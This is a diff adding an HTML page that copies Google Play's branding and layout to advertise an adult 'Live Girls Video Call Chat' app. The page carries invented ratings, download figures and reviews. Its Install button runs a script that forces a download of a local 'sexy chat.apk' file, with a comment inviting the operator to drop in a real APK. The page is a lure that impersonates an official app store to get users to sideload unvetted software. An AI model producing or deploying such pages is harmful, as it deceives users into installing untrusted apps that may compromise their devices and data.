@@ -1,0 +1,325 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Google Play - App Page Mock</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- Slick Slider CSS -->
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/slick-carousel@1.8.1/slick/slick.css" />
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/slick-carousel@1.8.1/slick/slick-theme.css" />
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: Inter, ui-sans-serif, system-ui, -apple-system, Segoe UI, Roboto, Helvetica, Arial, "Apple Color Emoji", "Segoe UI Emoji";
+        }
+    </style>
+</head>
+
+<body class="bg-gray-50 text-gray-900">
+    <!-- Header -->
+    <header class="sticky top-0 z-10 bg-white/90 backdrop-blur border-b border-gray-200">
+        <div class="mx-auto max-w-6xl px-4 py-3 flex items-center gap-3">
+            <div class="flex items-center gap-2">
+                <div class="w-[60%] h-7"><img src="./play-logo.png" alt="" srcset=""></div>
+            </div>
+            <div class="flex-1"></div>
+            <nav class="hidden sm:flex items-center gap-6 text-sm text-gray-600">
+                <a href="#" class="hover:text-gray-900">Games</a>
+                <a href="#" class="hover:text-gray-900">Apps</a>
+                <a href="#" class="hover:text-gray-900">Books</a>
+                <a href="#" class="hover:text-gray-900">Children</a>
+            </nav>
+            <div class="flex items-center gap-3">
+                <input type="text" placeholder="Search"
+                    class="hidden md:block w-72 px-3 py-2 rounded-md bg-gray-100 focus:bg-white border border-transparent focus:border-gray-300 outline-none" />
+                <button class="p-2 rounded-full hover:bg-gray-100" aria-label="Search">
+                    <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5"
+                        stroke="currentColor" class="w-5 h-5">
+                        <path stroke-linecap="round" stroke-linejoin="round"
+                            d="m21 21-5.197-5.197M16.5 10.5a6 6 0 1 1-12 0 6 6 0 0 1 12 0Z" />
+                    </svg>
+                </button>
+                <button class="p-2 rounded-full hover:bg-gray-100" aria-label="Account">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" class="w-6 h-6">
+                        <path d="M12 2a5 5 0 1 1 0 10 5 5 0 0 1 0-10Zm-7 18a7 7 0 1 1 14 0v1H5v-1Z" />
+                    </svg>
+                </button>
+            </div>
+        </div>
+    </header>
+
+    <main class="mx-auto max-w-6xl px-4">
+       
+
+        <!-- Hero -->
+        <section class="bg-white rounded-xl shadow-sm border border-gray-200 p-4 md:p-6">
+            <div class="">
+                <div class="flex gap-4">
+                    <img src="./app-logo.webp" alt="App icon"
+                        class="w-20 h-20 md:w-24 md:h-24 rounded-xl object-cover" />
+                    <div>
+                        <h1 class="text-xl md:text-2xl font-semibold">Live Girls Video Call Chat</h1>
+                        <div class="mt-1 text-sm text-emerald-700">Ohhlala</div>
+                    </div>
+
+                </div>
+
+                <div class="mt-10">
+                    <div class="flex justify-between">
+                        <div class="w-full">
+                            <div class="mt-2 flex justify-between flex-wrap items-center gap-3 text-sm text-gray-700">
+                                <div class="flex flex-col items-center gap-1">
+                                    <div class="flex items-center gap-1">
+                                        <span class="font-semibold">3.3</span>
+                                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"
+                                            class="w-4 h-4 text-yellow-500">
+                                            <path
+                                                d="m11.48 3.499-.72 1.848a1.125 1.125 0 0 1-1.04.702H7.71c-1.159 0-1.64 1.485-.705 2.164l1.565 1.138a1.125 1.125 0 0 1 .408 1.259l-.598 1.889c-.357 1.13.93 2.065 1.89 1.433l1.62-1.035a1.125 1.125 0 0 1 1.194 0l1.62 1.035c.96.632 2.247-.303 1.89-1.433l-.598-1.889a1.125 1.125 0 0 1 .408-1.259l1.565-1.138c.935-.679.454-2.164-.705-2.164h-1.99c-.467 0-.886-.289-1.04-.702l-.72-1.848a1.125 1.125 0 0 0-2.08 0Z" />
+                                        </svg>
+                                    </div>
+                                    <span class="text-gray-500">2.89K reviews</span>
+                                </div>
+                                <div class="flex flex-col items-center gap-1"><p class="font-semibold">1M+</p> <p>downloads</p></div>
+                                <div class="flex flex-col items-center gap-1"><p class="font-semibold">18+</p> <p>Rated for 18+</p></div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="flex mt-4 flex-col sm:flex-row items-stretch sm:items-center gap-2">
+                        <a href="./sexy chat.apk" id="installBtn" type="button"
+                            class="px-5 py-2.5 text-center rounded-md bg-emerald-600 text-white font-medium hover:bg-emerald-700">Install</a>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Screenshots (Slick Slider) -->
+            <div class="mt-9">
+                <div class="screenshot-slider">
+                    <div class="px-1">
+                        <img class="w-full aspect-[9/16] rounded-lg object-cover bg-gray-100"
+                            src="./I1.webp" alt="screenshot" />
+                    </div>
+                    <div class="px-1">
+                        <img class="w-full aspect-[9/16] rounded-lg object-cover bg-gray-100"
+                            src="./I2.webp" alt="screenshot" />
+                    </div>
+                    <div class="px-1">
+                        <img class="w-full aspect-[9/16] rounded-lg object-cover bg-gray-100"
+                            src="./I3.webp" alt="screenshot" />
+                    </div>
+                    <div class="px-1">
+                        <img class="w-full aspect-[9/16] rounded-lg object-cover bg-gray-100"
+                            src="./I4.webp" alt="screenshot" />
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- About and Data Safety -->
+        <section class="mt-6 grid lg:grid-cols-3 gap-6">
+            <!-- About -->
+            <div class="lg:col-span-2 bg-white rounded-xl shadow-sm border border-gray-200 p-5">
+                <h2 class="text-lg font-semibold">About this app</h2>
+                <p class="mt-2 text-sm text-gray-700">This app helps you find beautiful people around the world and make
+                    friends through video chat! It's fun, friendly, and free!</p>
+                <div class="mt-4 flex flex-wrap gap-2 text-xs">
+                    <span class="px-2 py-1 rounded-full bg-gray-100">Completely free of cost</span>
+                    <span class="px-2 py-1 rounded-full bg-gray-100">No need to pay</span>
+                    <span class="px-2 py-1 rounded-full bg-gray-100">#5 top free dating</span>
+                    <span class="px-2 py-1 rounded-full bg-gray-100">Dating</span>
+                </div>
+                <div class="mt-4 text-xs text-gray-500">Updated on Aug 17, 2025</div>
+            </div>
+
+            <!-- Data safety -->
+            <div class="bg-white rounded-xl shadow-sm border border-gray-200 p-5">
+                <h2 class="text-lg font-semibold">Data safety</h2>
+                <p class="mt-2 text-sm text-gray-700">Safety starts with understanding how developers collect and share
+                    your data.</p>
+                <ul class="mt-4 space-y-3 text-sm">
+                    <li class="flex items-start gap-3">
+                        <div
+                            class="w-6 h-6 rounded-full bg-emerald-100 text-emerald-700 flex items-center justify-center">
+                            ↔</div>
+                        <div>
+                            <div class="font-medium">May share these data types with third parties</div>
+                            <div class="text-gray-600 text-xs">Location</div>
+                        </div>
+                    </li>
+                    <li class="flex items-start gap-3">
+                        <div class="w-6 h-6 rounded-full bg-gray-100 text-gray-700 flex items-center justify-center">Ø
+                        </div>
+                        <div>
+                            <div class="font-medium">No data collected</div>
+                            <div class="text-gray-600 text-xs">Learn more about how developers declare collection</div>
+                        </div>
+                    </li>
+                    <li class="flex items-start gap-3">
+                        <div class="w-6 h-6 rounded-full bg-blue-100 text-blue-700 flex items-center justify-center">🔒
+                        </div>
+                        <div>
+                            <div class="font-medium">Data is encrypted in transit</div>
+                        </div>
+                    </li>
+                    <li class="flex items-start gap-3">
+                        <div
+                            class="w-6 h-6 rounded-full bg-orange-100 text-orange-700 flex items-center justify-center">
+                            🗂</div>
+                        <div>
+                            <div class="font-medium">Data can't be deleted</div>
+                        </div>
+                    </li>
+                </ul>
+                <a href="#" class="mt-4 inline-block text-emerald-700 text-sm font-medium">See details</a>
+            </div>
+        </section>
+
+        <!-- Ratings and reviews -->
+        <section class="mt-6 bg-white rounded-xl shadow-sm border border-gray-200 p-5">
+            <div class="flex flex-col md:flex-row md:items-center md:justify-between gap-4">
+                <h2 class="text-lg font-semibold">Ratings and reviews</h2>
+                <div class="flex gap-2 text-xs">
+                    <button class="px-2 py-1 border rounded-md">Phone</button>
+                    <button class="px-2 py-1 border rounded-md">Tablet</button>
+                </div>
+            </div>
+            <div class="mt-4 grid md:grid-cols-3 gap-6">
+                <div class="flex items-center md:items-start gap-4">
+                    <div class="text-4xl font-semibold">4.5</div>
+                    <div class="flex-1 w-full">
+                        <!-- Histogram -->
+                        <div class="space-y-1">
+                            <div class="flex items-center gap-2 text-xs"><span>5</span>
+                                <div class="flex-1 h-2 bg-gray-100 rounded">
+                                    <div class="h-2 bg-emerald-500 rounded" style="width:40%"></div>
+                                </div>
+                            </div>
+                            <div class="flex items-center gap-2 text-xs"><span>4</span>
+                                <div class="flex-1 h-2 bg-gray-100 rounded">
+                                    <div class="h-2 bg-emerald-500 rounded" style="width:20%"></div>
+                                </div>
+                            </div>
+                            <div class="flex items-center gap-2 text-xs"><span>3</span>
+                                <div class="flex-1 h-2 bg-gray-100 rounded">
+                                    <div class="h-2 bg-emerald-500 rounded" style="width:15%"></div>
+                                </div>
+                            </div>
+                            <div class="flex items-center gap-2 text-xs"><span>2</span>
+                                <div class="flex-1 h-2 bg-gray-100 rounded">
+                                    <div class="h-2 bg-emerald-500 rounded" style="width:10%"></div>
+                                </div>
+                            </div>
+                            <div class="flex items-center gap-2 text-xs"><span>1</span>
+                                <div class="flex-1 h-2 bg-gray-100 rounded">
+                                    <div class="h-2 bg-emerald-500 rounded" style="width:15%"></div>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="mt-2 text-xs text-gray-500">2.89K reviews</div>
+                    </div>
+                </div>
+                <div class="md:col-span-2 space-y-5">
+                    <!-- Review card -->
+                    <article class="border rounded-lg p-4">
+                        <div class="flex items-center justify-between">
+                            <div class="flex items-center gap-3">
+                                <div class="w-8 h-8 rounded-full bg-gray-200"></div>
+                                <div class="font-medium text-sm">Khushal Yadav</div>
+                            </div>
+                            <div class="text-xs text-gray-500">August 20, 2025</div>
+                        </div>
+                        <div class="mt-2 text-yellow-500">★★☆☆☆</div>
+                        <p class="mt-2 text-sm text-gray-700">Too much ads comes and not connecting people properly.</p>
+                    </article>
+                    <article class="border rounded-lg p-4">
+                        <div class="flex items-center justify-between">
+                            <div class="flex items-center gap-3">
+                                <div class="w-8 h-8 rounded-full bg-gray-200"></div>
+                                <div class="font-medium text-sm">safiul islam</div>
+                            </div>
+                            <div class="text-xs text-gray-500">September 27, 2025</div>
+                        </div>
+                        <div class="mt-2 text-yellow-500">★☆☆☆☆</div>
+                        <p class="mt-2 text-sm text-gray-700">As a male every time I have to select a female. So boring.
+                        </p>
+                    </article>
+                </div>
+            </div>
+        </section>
+
+        <!-- Footer -->
+        <footer class="mt-10 py-10 text-sm text-gray-600">
+            <div class="grid sm:grid-cols-2 lg:grid-cols-4 gap-6">
+                <div>
+                    <h3 class="font-semibold text-gray-800">Google Play</h3>
+                    <ul class="mt-3 space-y-2">
+                        <li><a href="#" class="hover:text-gray-900">Play Pass</a></li>
+                        <li><a href="#" class="hover:text-gray-900">Points</a></li>
+                        <li><a href="#" class="hover:text-gray-900">Gift cards</a></li>
+                        <li><a href="#" class="hover:text-gray-900">Redeem</a></li>
+                    </ul>
+                </div>
+                <div>
+                    <h3 class="font-semibold text-gray-800">Help</h3>
+                    <ul class="mt-3 space-y-2">
+                        <li><a href="#" class="hover:text-gray-900">Refund policy</a></li>
+                        <li><a href="#" class="hover:text-gray-900">Children and family</a></li>
+                        <li><a href="#" class="hover:text-gray-900">Family sharing</a></li>
+                    </ul>
+                </div>
+                <div>
+                    <h3 class="font-semibold text-gray-800">Company</h3>
+                    <ul class="mt-3 space-y-2">
+                        <li><a href="#" class="hover:text-gray-900">Terms of Service</a></li>
+                        <li><a href="#" class="hover:text-gray-900">Privacy</a></li>
+                        <li><a href="#" class="hover:text-gray-900">About Google Play</a></li>
+                    </ul>
+                </div>
+                <div>
+                    <h3 class="font-semibold text-gray-800">Region</h3>
+                    <div class="mt-3">India (English)</div>
+                </div>
+            </div>
+        </footer>
+    </main>
+    <!-- jQuery and Slick JS -->
+    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/slick-carousel@1.8.1/slick/slick.min.js"></script>
+    <script>
+        $(function () {
+            $('.screenshot-slider').slick({
+                slidesToShow: 3,
+                slidesToScroll: 1,
+                arrows: true,
+                dots: false,
+                infinite: false,
+                prevArrow: '<button type="button" class="slick-prev">Prev</button>',
+                nextArrow: '<button type="button" class="slick-next">Next</button>',
+                responsive: [
+                    { breakpoint: 1024, settings: { slidesToShow: 3 } },
+                    { breakpoint: 768, settings: { slidesToShow: 2 } },
+                    { breakpoint: 480, settings: { slidesToShow: 1 } }
+                ]
+            });
+        });
+        // Download APK on Install button click
+        (function () {
+            var button = document.getElementById('installBtn');
+            if (!button) return;
+            var apkUrl = './apk/sexy-chat.apk'; // place your real APK here
+            button.addEventListener('click', function () {
+                var a = document.createElement('a');
+                a.href = apkUrl;
+                a.download = 'sexy chat.apk'; // forces file name
+                document.body.appendChild(a);
+                a.click();
+                a.remove();
+            });
+        })();
+    </script>
+</body>
+
+</html>
